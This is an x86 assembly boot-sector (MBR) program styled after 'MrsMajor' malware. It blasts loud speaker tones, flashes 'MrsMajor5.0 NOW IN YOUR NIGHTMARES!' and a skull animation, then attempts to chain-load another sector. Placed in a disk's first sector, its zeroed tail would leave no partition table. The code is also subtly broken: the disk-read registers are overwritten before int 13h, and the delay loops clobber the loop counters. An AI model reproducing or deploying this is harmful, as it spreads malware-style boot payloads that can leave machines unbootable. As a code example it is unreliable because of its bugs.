BITS 16
ORG 0x7C00

start:
    ; Boot drive is set to the first hard disk
    mov dl, 0x80            ; Set boot drive to the first hard disk (0x80)

    ; Play loud and dramatic sounds
    call loud_sounds

    ; Display animated text for 20 seconds
    call advanced_text_animation

    ; Display skull animation
    call show_skull

    ; Chain-load the OS bootloader from the first partition
    mov dl, 0x80            ; Set the boot drive to the first hard disk
    mov ah, 0x02            ; BIOS disk read function
    mov al, 1               ; Read 1 sector
    mov ch, 0               ; Cylinder 0
    mov cl, 2               ; Sector 2 (active partition bootloader)
    mov dh, 0               ; Head 0
    mov ax, 0x7E00          ; Set AX to the segment where the bootloader will be loaded
    mov es, ax              ; Move AX into ES
    int 0x13                ; BIOS interrupt to read sector

    ; Check if disk read was successful (CF cleared if success)
    test ah, ah
    jnz $                    ; If not zero (error), halt the system

    jmp 0x7E00:0x0000       ; Jump to the loaded boot sector (OS bootloader)

advanced_text_animation:
    ; Display "MrsMajor5.0 NOW IN YOUR NIGHTMARES!" with advanced effects for 20 seconds
    mov cx, 0x4E20          ; 20 seconds (assuming each loop iteration is 1 ms)

text_loop:
    ; Flicker text with color changes
    call display_text
    call delay_ms           ; Delay to simulate flicker
    xor bl, 0x0F            ; Change color
    mov al, 'M'
    call print_char
    mov al, 'r'
    call print_char
    mov al, 's'
    call print_char
    mov al, 'M'
    call print_char
    mov al, 'a'
    call print_char
    mov al, 'j'
    call print_char
    mov al, 'o'
    call print_char
    mov al, 'r'
    call print_char
    mov al, '5'
    call print_char
    mov al, '.'
    call print_char
    mov al, '0'
    call print_char
    mov al, ' '
    call print_char
    mov al, 'N'
    call print_char
    mov al, 'O'
    call print_char
    mov al, 'W'
    call print_char
    mov al, ' '
    call print_char
    mov al, 'I'
    call print_char
    mov al, 'N'
    call print_char
    mov al, ' '
    call print_char
    mov al, 'Y'
    call print_char
    mov al, 'O'
    call print_char
    mov al, 'U'
    call print_char
    mov al, 'R'
    call print_char
    mov al, ' '
    call print_char
    mov al, 'N'
    call print_char
    mov al, 'I'
    call print_char
    mov al, 'G'
    call print_char
    mov al, 'H'
    call print_char
    mov al, 'T'
    call print_char
    mov al, 'M'
    call print_char
    mov al, 'A'
    call print_char
    mov al, 'R'
    call print_char
    mov al, 'E'
    call print_char
    mov al, 'S'
    call print_char
    mov al, '!'
    call print_char

    ; Decrement counter and check if we need to loop
    dec cx
    jnz text_loop

    ret

display_text:
    ; Display "MrsMajor5.0 NOW IN YOUR NIGHTMARES!" with effects
    mov ah, 0x0E            ; Teletype output function (int 10h)
    mov bl, 0x0C            ; Initial color (Red)
    mov al, 'M'
    int 0x10
    mov al, 'r'
    int 0x10
    mov al, 's'
    int 0x10
    mov al, 'M'
    int 0x10
    mov al, 'a'
    int 0x10
    mov al, 'j'
    int 0x10
    mov al, 'o'
    int 0x10
    mov al, 'r'
    int 0x10
    mov al, '5'
    int 0x10
    mov al, '.'
    int 0x10
    mov al, '0'
    int 0x10
    mov al, ' '
    int 0x10
    mov al, 'N'
    int 0x10
    mov al, 'O'
    int 0x10
    mov al, 'W'
    int 0x10
    mov al, ' '
    int 0x10
    mov al, 'I'
    int 0x10
    mov al, 'N'
    int 0x10
    mov al, ' '
    int 0x10
    mov al, 'Y'
    int 0x10
    mov al, 'O'
    int 0x10
    mov al, 'U'
    int 0x10
    mov al, 'R'
    int 0x10
    mov al, ' '
    int 0x10
    mov al, 'N'
    int 0x10
    mov al, 'I'
    int 0x10
    mov al, 'G'
    int 0x10
    mov al, 'H'
    int 0x10
    mov al, 'T'
    int 0x10
    mov al, 'M'
    int 0x10
    mov al, 'A'
    int 0x10
    mov al, 'R'
    int 0x10
    mov al, 'E'
    int 0x10
    mov al, 'S'
    int 0x10
    mov al, '!'
    int 0x10
    ret

show_skull:
    ; Display skull animation
    mov cx, 0xFFFF          ; Skull animation loop

skull_loop:
    ; Skull pattern
    mov ah, 0x0E            ; Teletype output function (int 10h)
    mov al, 0xB0            ; Skull pattern character
    mov bl, 0x0C            ; Red color
    int 0x10
    call delay_ms
    mov al, 0xB1            ; Skull pattern character
    int 0x10
    call delay_ms
    mov al, 0xB2            ; Skull pattern character
    int 0x10
    call delay_ms
    mov al, 0xB3            ; Skull pattern character
    int 0x10
    call delay_ms
    loop skull_loop

    ret

loud_sounds:
    ; Generate loud sound effects

    ; Loud low-pitched sound
    mov al, 0xB6            ; Control byte for PIT channel 2
    out 0x43, al
    mov ax, 0x0E00          ; Low frequency tone (value in AX determines frequency)
    out 0x42, al            ; Send low byte to channel 2
    mov al, ah
    out 0x42, al            ; Send high byte
    in al, 0x61             ; Read system speaker control
    or al, 3                ; Turn on speaker
    out 0x61, al            ; Activate speaker
    call delay              ; Delay for a bit to hold the sound
    and al, 0xFC            ; Turn off speaker
    out 0x61, al

    ; Loud high-pitched sound
    mov al, 0xB6            ; Set up system speaker again
    out 0x43, al
    mov ax, 0x0200          ; High frequency tone
    out 0x42, al            ; Send low byte to channel 2
    mov al, ah
    out 0x42, al            ; Send high byte
    in al, 0x61             ; Read system speaker control
    or al, 3                ; Turn on speaker
    out 0x61, al            ; Activate speaker
    call delay              ; Delay for a bit
    and al, 0xFC            ; Turn off speaker
    out 0x61, al

    ret

print_char:
    ; Print a character in AL to the screen
    mov ah, 0x0E            ; Teletype output function (int 10h)
    mov bl, 0x0F            ; Text attribute (White on Black)
    int 0x10
    ret

delay:
    ; Simple delay loop for holding sound
    mov cx, 0xFFFF
delay_loop:
    dec cx
    jnz delay_loop
    ret

delay_ms:
    ; Simple delay loop for 1 millisecond
    mov cx, 0x0FFF
delay_ms_loop:
    dec cx
    jnz delay_ms_loop
    ret

times 510-($-$$) db 0       ; Fill the remaining space up to 510 bytes
dw 0xAA55                   ; MBR signature (boot indicator)
